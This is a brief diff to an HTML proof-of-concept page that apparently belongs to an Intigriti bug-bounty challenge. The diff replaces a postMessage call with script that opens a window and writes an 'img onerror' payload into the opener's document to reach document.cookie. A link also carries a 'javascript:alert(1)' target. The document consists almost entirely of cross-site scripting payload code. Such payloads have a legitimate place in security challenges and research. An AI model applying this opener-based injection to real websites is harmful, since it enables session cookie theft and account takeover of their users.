@@ -11,10 +11,10 @@
 
   <a href="https://challenge.intigriti.io/" target="javascript:alert(1)">PoC</a>
   
-
   <script>
-parent.window.opener.postMessage("Hi parent, im ready","*");
-</script>
+    myWindow = window.open("", "myWindow", "width=200,height=100");
+  	myWindow.opener.document.write("<img src=x onerror=alert(document.cookie)>");
+  </script>
 
   </body>
 </html>
